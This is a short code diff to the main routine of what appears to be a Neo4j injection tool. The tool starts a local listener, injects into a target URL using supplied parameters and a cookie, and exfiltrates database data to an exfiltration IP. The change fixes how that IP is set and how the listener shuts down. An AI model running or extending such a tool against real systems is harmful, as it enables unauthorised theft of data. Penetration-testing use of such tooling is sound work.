@@ -113,22 +113,25 @@ def main():
     # 
     if (not args.exfil_ip):
         hostname = socket.gethostname()
-        args.exfil_ip = socket.gethostbyname(hostname) + ":" + str(args.listen_port)
+        args.exfil_ip = socket.gethostbyname(hostname)
 
         # Start the listener in a separate thread
         listener = Listener(args.listen_port)
         listener_thread = threading.Thread(target=listener.start_listener)
         listener_thread.daemon = True
         listener_thread.start()
+    else:
+        listener = None
 
     injector = Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie)
 
     # Begin exfiltration process
     injector.exfil_data()
 
-    # Shutdown the listener and join the thread
-    listener.stop_listener()
-    listener_thread.join()
+    if (listener):
+        # Shutdown the listener and join the thread
+        listener.stop_listener()
+        listener_thread.join()
 
 if __name__ == "__main__":
     main()
